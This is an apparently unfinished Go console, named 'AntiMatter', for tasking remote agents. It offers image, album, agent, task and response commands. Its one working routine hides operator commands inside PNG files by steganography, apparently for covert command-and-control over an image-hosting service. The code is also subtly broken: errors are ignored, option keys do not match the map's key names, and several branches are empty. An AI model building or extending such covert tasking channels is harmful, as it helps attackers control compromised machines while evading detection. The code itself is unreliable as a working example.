package main

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"image/png"
	"os"
	"strings"

	stego "github.com/auyer/steganography"
	"github.com/fatih/color"
	"github.com/manifoldco/promptui"
)

// validateOptions is a function that just helps check to make sure you're choosing a correct option
func validateOptions(slice []string, val string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, val) {
			return true
		}
	}
	return false
}

// Global map for the Image module
var imageOptions = map[string]string{"Command": "", "Response": "", "BaseImage": "", "NewFilename": "", "ClientID": "", "AlbumID": "", "BearerToken": ""}

func createImage(command string, response string, img_path string, img_name string, token string) {
	inFile, _ := os.Open(img_path)
	reader := bufio.NewReader(inFile)
	img, _ := png.Decode(reader)

	w := new(bytes.Buffer)
	err := stego.Encode(w, img, []byte(command))
	if err != nil {
		fmt.Printf("Error encoding file %v", err)
		return
	} else {
		fmt.Println("[+] Success creating file!")
	}

	outFile, _ := os.Create(img_name)
	w.WriteTo(outFile)
	outFile.Close()

}

func main() {
	for {
		options := []string{"Options", "Image", "Album", "Agent", "Task", "List", "Delete", "Response", "Exit", "Quit"}
		validate := func(input string) error {
			// _, err := strconv.ParseFloat(input, 64)
			found := validateOptions(options, input)

			if !found {
				return errors.New("Invalid Option")
			}

			return nil
		}

		// Each template displays the data received from the prompt with some formatting.
		templates := &promptui.PromptTemplates{
			Prompt:  "{{ . }} ",
			Valid:   "{{ . | green }} ",
			Invalid: "{{ . | red }} ",
			Success: "{{ . | cyan }} ",
		}

		prompt := promptui.Prompt{
			Label:     "AnitMatter >",
			Templates: templates,
			Validate:  validate,
		}

		result, err := prompt.Run()

		if err != nil {
			fmt.Printf("Prompt failed %v\n", err)
			return
		}

		//fmt.Printf("You chose %q\n", result)

		if strings.EqualFold(result, "options") {
			fmt.Println("")
			fmt.Println("Valid Commands:		Description:")
			fmt.Println("\n")
			fmt.Println(" Image		Create an Image for agent tasking")
			fmt.Println(" Album		Create an Album for agent responses")
			fmt.Println(" Agent		Create an Agent entity")
			fmt.Println(" Task		Create Tasking for agent")
			fmt.Println(" List		List images, albums, agents, and tasks")
			fmt.Println(" Delete		Delete images, albums, agents, and tasks")
			fmt.Println(" Response	Retrieve Responses from tasked agents")
			fmt.Println(" Exit/Quit	Exit program")
			fmt.Println("")
		}

		if strings.EqualFold(result, "exit") {
			os.Exit(0)
		}

		if strings.EqualFold(result, "Image") {
			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Print("AntiMatter/Image > ")
				color.Unset()
				text, _ := reader.ReadString('\n')

				if strings.TrimRight(text, "\n") == "options" {
					fmt.Println("\n---OPTIONS---")
					for key, value := range imageOptions {
						if value == "" {

							fmt.Println(color.CyanString(key), ": None")
						} else {
							fmt.Println(color.CyanString(key), ":", value)
						}

					}
				} else if strings.Contains(text, "set") {
					if strings.Contains(text, "command") {
						command := strings.Split(text, "command ")
						imageOptions["Command"] = strings.Replace(strings.Join(command[1:], ""), "\n", "", -1)

						// Left off here, TODO: Add the rest of the Image module options
					} else if strings.Contains(text, "response") {
						if strings.Contains(text, "s") {
							imageOptions["Response"] = "Short"
							imageOptions["ClientID"] = ""
							imageOptions["AlbumID"] = ""
						}
						//if strings.Contains(text, "n") {
						//	imageOptions["Response"] = "No"
						//	}
						if strings.Contains(text, "l") {
							imageOptions["Response"] = "Long"
							imageOptions["BearerToken"] = ""
							imageOptions["AlbumID"] = ""
						}
					} else if strings.Contains(text, "base-image") {
						baseImage := strings.Split(text, "base-image ")
						imageOptions["BaseImage"] = strings.Replace(strings.Join(baseImage[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "new-filename") {
						newFilename := strings.Split(text, "new-filename ")
						imageOptions["NewFilename"] = strings.Replace(strings.Join(newFilename[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "client-id") {
						clientId := strings.Split(text, "client-id ")
						imageOptions["ClientId"] = strings.Replace(strings.Join(clientId[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "album-id") {
						albumId := strings.Split(text, "album-id ")
						imageOptions["AlbumId"] = strings.Replace(strings.Join(albumId[1:], ""), "\n", "", -1)
					} else if strings.Contains(text, "bearer-token") {
						bearerToken := strings.Split(text, "bearer-token ")
						imageOptions["BearerToken"] = strings.Replace(strings.Join(bearerToken[1:], ""), "\n", "", -1)
					}

				} else if strings.Contains(text, "go") {
					createImage(imageOptions["Command"], imageOptions["Response"], imageOptions["BaseImage"], imageOptions["NewFilename"], imageOptions["BearerToken"])

				} else if strings.Contains(text, "exit") {
					break
				}

			}
		}
		if strings.EqualFold(result, "") {
		}

		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
		if strings.EqualFold(result, "") {
		}
	}
}
